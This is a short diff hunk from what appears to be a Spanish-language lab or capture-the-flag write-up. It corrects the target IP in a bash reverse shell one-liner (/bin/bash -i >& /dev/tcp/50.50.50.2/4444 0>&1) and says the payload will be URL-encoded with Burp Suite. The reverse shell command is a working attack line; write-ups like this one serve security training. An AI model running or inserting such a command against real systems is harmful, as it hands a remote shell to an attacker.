@@ -765,7 +765,7 @@ host: 40.40.40.3
 
 la revershell debe apuntar a la ip 50.50.50.2 y al puerto 4444
 
-/bin/bash -i >& /dev/tcp/40.40.40.3/4444 0>&1
+/bin/bash -i >& /dev/tcp/50.50.50.2/4444 0>&1
 
 pero esto se debe url-encodear y para esto usare burpsuite, el resultado seria:
 
